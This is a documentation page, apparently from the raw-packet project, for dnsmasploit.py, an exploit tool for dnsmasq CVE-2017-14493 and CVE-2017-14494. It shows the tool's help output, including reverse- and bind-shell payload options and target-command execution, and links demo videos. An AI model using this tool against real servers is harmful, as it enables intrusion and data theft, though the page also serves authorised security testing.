---
layout: page
title: Binary Exploits
permalink: /scripts/binary/
parent: Scripts
---

# Exploits 

## Script: [dnsmasploit.py](https://github.com/raw-packet/raw-packet/blob/master/Scripts/Binary/dnsmasploit.py)

This script implements an exploit for CVE-2017-14493 and CVE-2017-14494 vulnerabilities in dnsmasq (DNS Server).

```
root@kali:~/raw-packet# ./dnsmasploit.py -h
usage: dnsmasploit.py [-h] [-i INTERFACE] [-e] [-l] [-f FILE_NAME] -t TARGET
                      [-p TARGET_PORT] [-a ARCHITECTURE] [-v VERSION]
                      [--interpreter INTERPRETER]
                      [--interpreter_arg INTERPRETER_ARG] [--payload PAYLOAD]
                      [--command COMMAND] [--bind_port BIND_PORT]
                      [--reverse_port REVERSE_PORT]
                      [--reverse_host REVERSE_HOST]

Exploit for dnsmasq CVE-2017-14493 and CVE-2017-14494

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Set interface name for send packets
  -e, --exploit         Exploit (CVE-2017-14493) works only if Stack cookie
                        and PIE disabled
  -l, --data_leak       Data leakage (CVE-2017-14494)
  -f FILE_NAME, --file_name FILE_NAME
                        Set file name for leak data
  -t TARGET, --target TARGET
                        Set target IPv6 address
  -p TARGET_PORT, --target_port TARGET_PORT
                        Set target port, default=547
  -a ARCHITECTURE, --architecture ARCHITECTURE
                        Set architecture (i386, amd64 or arm), default=i386
  -v VERSION, --version VERSION
                        Set dnsmasq version (2.70, 2.71, 2.72, 2.73, 2.74,
                        2.75, 2.76, 2.77), default=2.77
  --interpreter INTERPRETER
                        Set path to interpreter on target, default="/bin/bash"
  --interpreter_arg INTERPRETER_ARG
                        Set interpreter argument, default="-c"
  --payload PAYLOAD     Set payload (bind_awk, reverse_awk, reverse_bash,
                        reverse_php, reverse_nc, reverse_nce),
                        default=reverse_nc
  --command COMMAND     Set command for executing on target
  --bind_port BIND_PORT
                        Set bind port, default=4444
  --reverse_port REVERSE_PORT
                        Set reverse port, default=4444
  --reverse_host REVERSE_HOST
                        Set reverse host
```

### Demo video exploit for CVE-2017-14493:
[![dnsmasploit preview](https://j.gifs.com/7LWln8.gif)](https://youtu.be/VWr0zCZlMrE)

### Demo video exploit for CVE-2017-14494:
[![dnsmasploit preview](https://j.gifs.com/1rB5VG.gif)](https://youtu.be/GqMuZ1wMCWQ)

---
